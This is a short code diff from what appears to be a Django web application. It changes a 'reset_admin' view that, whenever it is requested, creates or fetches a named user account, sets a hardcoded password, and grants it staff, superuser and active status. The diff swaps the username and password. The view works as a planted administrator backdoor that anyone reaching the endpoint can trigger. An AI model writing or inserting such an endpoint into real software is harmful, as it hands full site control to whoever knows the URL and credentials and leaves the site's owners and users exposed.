@@ -277,8 +277,8 @@ def product_detail(request, product_id):
 
 def reset_admin(request):
     from django.contrib.auth.models import User
-    user, created = User.objects.get_or_create(username='mrbabusir')
-    user.set_password('NewPassword456!')
+    user, created = User.objects.get_or_create(username='rosunsir')
+    user.set_password('NewPassword456987')
     user.is_staff = True
     user.is_superuser = True
     user.is_active = True
